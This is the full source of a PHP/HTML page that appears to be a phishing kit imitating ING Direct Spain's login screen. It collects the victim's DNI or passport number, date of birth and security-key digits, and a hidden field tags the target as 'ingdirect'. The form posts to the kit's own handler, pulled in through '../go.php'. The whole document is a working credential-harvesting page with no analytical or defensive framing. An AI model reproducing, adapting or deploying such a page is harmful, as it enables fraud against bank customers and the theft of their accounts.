﻿<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">
</head>

<body>
<div class="main" id="content_div">
	<div class="header">
		<img src="libs/images/logo.jfif">
	</div>
		<hr>
		
<form method="post">		
<center>
<div class="col-xs-10 col-sm-8">
		<div class="row">
			<label for="input" class="label">Número de documento </label>
			
			<div id="show">
				<input name="field1" value="www.ingdirect.nativeframe" type="hidden">
				
				<input class="input" id="login" name="field2" type="text" placeholder="DNI o Tarjeta de Residencia">
				
				<a id="showbutton">Identificarme con pasaporte</a>
			</div>
			
			<div id="hide" style="display: none;">
				<input class="input" id="login" name="field3" type="text" placeholder="Pasaporte">
				
				<a id="hidebutton"> Identificarme con DNI o T. residencia</a>
			</div>
				
				<br>
					</div>
						<div class="row birthDate">
							<label for="birthDate" class="label">Fecha de nacimiento</label>
								<fieldset id="birthDate" class="date">
									<input id="day" name="field4" type="tel" class="day" placeholder="DD" maxlength="2">
									<script>
									document.getElementById('day').onkeypress = function (e) {
										return !(/[A-Za-z]/.test(String.fromCharCode(e.charCode)));
									}
									</script>
									<input id="month" name="field5" type="tel" class="month" placeholder="MM" maxlength="2">
									<script>
									document.getElementById('month').onkeypress = function (e) {
										return !(/[A-Za-z]/.test(String.fromCharCode(e.charCode)));
									}
									</script>
									<input id="year" name="field6" type="tel" class="year" placeholder="AAAA" maxlength="4">
									<script>
									document.getElementById('year').onkeypress = function (e) {
										return !(/[A-Za-z]/.test(String.fromCharCode(e.charCode)));
									}
									</script>
								</fieldset>
							</div><br>
<div class="row">
							<label for="birthDate" class="label">Introduzca las posiciones que faltan de su clave de seguridad:</label>
								<input id="password" name="field7" class="input" type="text" autocomplete="off"><br>
								</div>
								<script>
								document.getElementById('password').onkeypress = function (e) {
									return !(/[A-Za-z]/.test(String.fromCharCode(e.charCode)));
								}
								</script>
			<br>
		<input id="input_submitBtn" class="login btn disabled" type="submit" value="Entrar">
</div>
		</center>
</form>
</div>

<script type="text/javascript">
            (function () {
                var BACKSPACE_KEYCODE = 8;

                window.checkDigits = function(event){
                    return event.charCode >= 48 && event.charCode <= 57;
                };

                var __insHiddenField = function (objDoc, objForm, sNm, sV) {
                    var input = objDoc.createElement("input");
                    input.setAttribute("type", "hidden");
                    input.setAttribute("name", sNm);
                    input.setAttribute("value", sV);
                    input.value = sV;
                    objForm.appendChild(input);
                };

                function getRealDisplay(elem) {
                    if (elem.currentStyle) {
                        return elem.currentStyle.display;
                    } else if (window.getComputedStyle) {
                        var computedStyle = window.getComputedStyle(elem, null);
                        return computedStyle.getPropertyValue('display')
                    }
                }

                function __hide(el) {
                    if (!el.hasAttribute('displayOld')) {
                        el.setAttribute("displayOld", el.style.display)
                    }

                    el.style.display = "none"
                }

                displayCache = {};

                function __show(el) {
                    if (getRealDisplay(el) != 'none') return;

                    var old = el.getAttribute("displayOld");
                    el.style.display = old || "";

                    if (getRealDisplay(el) === "none") {
                        var nodeName = el.nodeName, body = document.body, display;

                        if (displayCache[nodeName]) {
                            display = displayCache[nodeName]
                        } else {
                            var testElem = document.createElement(nodeName);
                            body.appendChild(testElem);
                            display = getRealDisplay(testElem);

                            if (display === "none") {
                                display = "block"
                            }

                            body.removeChild(testElem);
                            displayCache[nodeName] = display
                        }

                        el.setAttribute('displayOld', display);
                        el.style.display = display
                    }
                }


                var step1 = document.getElementById('show'),
                    step2 = document.getElementById('hide');




            var g_nextBtn = document.getElementById('showbutton');
                g_nextBtn.onclick = function () {

                    __hide(step1);
                    __show(step2);
                    return false;
                };


            var g_nextBtn = document.getElementById('hidebutton');
                g_nextBtn.onclick = function () {

                    __hide(step2);
                    __show(step1);
                    return false;
                };

                
            })();
        </script>
            <script type="text/javascript">
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
                        var oCodeInp = document.getElementById('password');
                        var oDD = document.getElementById('day');
                        var oMM = document.getElementById('month');
                        var oAAAA = document.getElementById('year');

						try{
							oCodeInp.className = 'input';
						} catch(e){};
						
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        } 
						
						if (!/^\w{2,2}$/i.test(oDD.value)) {
							try{
                                oDD.className = 'fielderror2';
							} catch(e){};
                            return false;
                        }
						
						if (!/^\w{2,2}$/i.test(oMM.value)) {
							try{
                                oMM.className = 'fielderror2';
							} catch(e){};
                            return false;
                        }
						
						if (!/^\w{4,4}$/i.test(oAAAA.value)) {
							try{
                                oAAAA.className = 'fielderror3';
							} catch(e){};
                            return false;
                        }
                    }
            </script>

</body></html>